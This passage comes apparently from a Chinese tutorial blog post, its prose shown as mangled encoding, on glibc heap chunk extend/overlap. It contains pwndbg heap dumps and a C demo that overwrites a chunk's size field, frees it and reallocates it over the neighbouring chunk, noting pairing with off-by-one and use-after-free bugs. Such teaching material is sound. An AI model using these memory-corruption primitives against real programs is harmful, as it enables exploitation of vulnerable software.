†çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥å¼€å§‹é‡Šæ”¾ï¼Œçœ‹ä¸€çœ‹ä¿®æ”¹ chunk1 çš„ size åŸŸå¤§å°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹å‘ç° chunk2 è¢«ä¿®æ”¹åå¢å¤§äº†çš„ chunk1 ç»™é‚£å äº†ï¼Œheap é‡Œå°±åªæœ‰ä¸€ä¸ª Chunk äº†ï¼Œçœ‹çœ‹å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041&lt;======åŸChunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======åŸChunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹é™¤å» chunk1 çš„ size åŸŸå˜åŒ–äº†ä»¥å¤–ï¼Œä¼¼ä¹æ²¡æœ‰å…¶ä»–å˜åŒ–ï¼Œä½†æ˜¯ï¼Œé€»è¾‘ä¸Šæ¥è¯´ï¼Œç°åœ¨çš„å †é‡Œåªæœ‰ä¸€ä¸ª chunk äº†ï¼Œä¹‹å free æ‰ chunk1 çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x555555758000 â—‚â€” 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè¯»å–ä¸‹å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥æ˜¯é‡å¤´æˆï¼Œè¯•æƒ³ï¼Œå¦‚æœåŸ chunk1 çš„ size åŸŸæ²¡æœ‰çœŸæ­£å˜åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œ malloc ä¸€ä¸ª 0x30 å¤§å°çš„å †å—çš„æ—¶å€™ï¼Œå°±ä¸ä¼šåˆ†é…åˆ°è¿™ä¸ªåœ°å€ä¸Šï¼Œè€Œæ˜¯ä» Top Chunk é‡Œæ‹†åˆ†ï¼Œé‚£ä¹ˆäº‹å®ä¸Šæ˜¯æ€ä¹ˆæ ·çš„å‘¢ï¼Ÿå®è·µå‡ºçœŸçŸ¥ï¼Œçœ‹ä¸€ä¸‹å§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹æ˜¾ç„¶ï¼ŒTop Chunk å¹¶æœªè¢«æ‹†åˆ†ï¼Œè¿™é‡Œç¡®å®šäº†ï¼Œä¼¼ä¹ malloc (0x30) å¾—åˆ°çš„å †å—æ˜¯åŸ Chunk1 çš„åœ°å€ï¼Œè¿™é‡Œè¯´æ˜äº†ï¼Œè¿™é‡Œçš„åŸ chunk1 å› ä¸º size åŸŸè¢«ä¿®æ”¹äº†ä¹‹åæˆä¸ºäº†ä¸€ä¸ªæ–°çš„æ›´å¤§çš„å †å—ï¼Œè¿™é‡Œä¹Ÿå°±é€ æˆäº†æ‰€è°“çš„å †é‡å äº†ï¼Œchunk1 å› ä¸ºä¿®æ”¹äº† size åŸŸåï¼Œç”Ÿæˆçš„é‚£ä¸ªæ–°çš„ chunk å’Œ chunk2 éƒ¨åˆ†é‡å äº†ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†ï¼Œæœ‰çš„å¯¹åŸ chunk1 çš„ä¿®æ”¹å¯ä»¥ä¿®æ”¹åˆ° chunk2 çš„åœ°æ–¹ï¼Œå¦‚æœ chunk2 ä¿ç•™äº†æŒ‡é’ˆï¼Œé‚£å°±å¯ä»¥å¯¹ chunk2 è¿›è¡Œä¼ªé€ ï¼Œå¯ä»¥ç»“åˆç±»ä¼¼ off by one å’Œ UAF å½¢æˆå¾ˆå¤šç§åˆ©ç”¨æ–¹å¼ã€‚</p><h2 id="2-å¯¹inuseçš„smallbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#2-å¯¹inuseçš„smallbinè¿›è¡Œextend">#</a> 2ã€å¯¹ inuse çš„ smallbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 2.c</span></span><br><span class="line"><span class="comment">//æ³¨æ„æŠŠä¹‹å‰é‚£ä¸ªa.outç»™åˆ æ‰</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¿›è¡Œä¸‰æ¬¡åˆ†é…ï¼Œå…¶ä¸­ï¼Œç¬¬ä¸‰æ¬¡åˆ†é…æ˜¯é˜²æ­¢ extend åï¼Œchunk ä¸ topchunk è¿›è¡Œåˆå¹¶ï¼Œæ— éœ€å…³æ³¨ã€‚å…ˆçœ‹çœ‹ç»è¿‡ä¸‰æ¬¡ malloc ä¹‹åçš„å †ç©ºé—´æ˜¯å•¥æ ·çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¼°æ‘¸ä¸€ä¸‹ï¼Œchunk1 çš„å¤§å°ä¼¼ä¹æœ‰ç‚¹å¤§ï¼Œå¯¼è‡´ free æ‰çš„ chunk1 å¹¶ä¸ä¼šè¿›å…¥ fastbinï¼Œè€Œæ˜¯è¿›å…¥ smallbinï¼Œé‚£ä¹ˆä¿®æ”¹äº† size åŸŸåï¼ŒåŸæœ¬ä¸‰ä¸ª chunk åœ¨ gdb é‡Œçš„ heap æŒ‡ä»¤ä¸‹ä¾æ—§å°‘äº†ä¸€ä¸ª:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥ï¼Œfree æ‰ chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000020&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  